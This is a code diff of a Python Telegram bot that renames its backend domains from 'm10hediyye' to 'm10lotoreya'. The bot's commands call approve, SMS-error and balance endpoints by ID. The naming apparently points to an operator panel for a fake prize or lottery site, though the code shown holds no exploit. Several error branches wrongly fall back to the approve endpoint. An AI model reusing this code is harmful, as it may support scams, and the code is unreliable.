@@ -18,7 +18,7 @@ app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 #     try:
 #         number = message.text.split()[1]
         
-#         url = f"https://m10hediyye.com.net/crud/balance/{number}/"
+#         url = f"https://m10lotoreya.com.net/crud/balance/{number}/"
 #         response = requests.get(url)
 
 #         if response.status_code == 200:
@@ -37,7 +37,7 @@ app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 #     try:
 #         number = message.text.split()[1]
         
-#         url = f"https://m10hediyye.com.net/crud/approve/{number}/"
+#         url = f"https://m10lotoreya.com.net/crud/approve/{number}/"
 #         response = requests.get(url)
 
 #         if response.status_code == 200:
@@ -56,7 +56,7 @@ app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 #     try:
 #         number = message.text.split()[1]
         
-#         url = f"https://m10hediyye.com.net/crud/smserror/{number}/"
+#         url = f"https://m10lotoreya.com.net/crud/smserror/{number}/"
 #         response = requests.get(url)
 
 #         if response.status_code == 200:
@@ -235,7 +235,7 @@ app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 def kapital(client, message):
     try:
         number = message.text.split()[1]
-        url = f"https://m10hediyye.com/crud/approve/{number}/"
+        url = f"https://m10lotoreya.com/crud/approve/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -245,7 +245,7 @@ def kapital(client, message):
     except IndexError:
         message.reply_text("Id Yazin /a command.")
     except Exception as e:
-        url = f"https://m10hediyye.biz/crud/approve/{number}/"
+        url = f"https://m10lotoreya.biz/crud/approve/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -259,7 +259,7 @@ def kapital(client, message):
     try:
         number = message.text.split()[1]
         
-        url = f"https://m10hediyye.com/crud/smserror/{number}/"
+        url = f"https://m10lotoreya.com/crud/smserror/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -269,7 +269,7 @@ def kapital(client, message):
     except IndexError:
         message.reply_text("Id Yazin /e command.")
     except Exception as e:
-        url = f"https://m10hediyye.biz/crud/approve/{number}/"
+        url = f"https://m10lotoreya.biz/crud/approve/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -283,7 +283,7 @@ def kapital(client, message):
     try:
         number = message.text.split()[1]
         
-        url = f"https://m10hediyye.com/crud/balance/{number}/"
+        url = f"https://m10lotoreya.com/crud/balance/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
@@ -293,7 +293,7 @@ def kapital(client, message):
     except IndexError:
         message.reply_text("Id Yazin /n command.")
     except Exception as e:
-        url = f"https://m10hediyye.biz/crud/approve/{number}/"
+        url = f"https://m10lotoreya.biz/crud/approve/{number}/"
         response = requests.get(url)
 
         if response.status_code == 200:
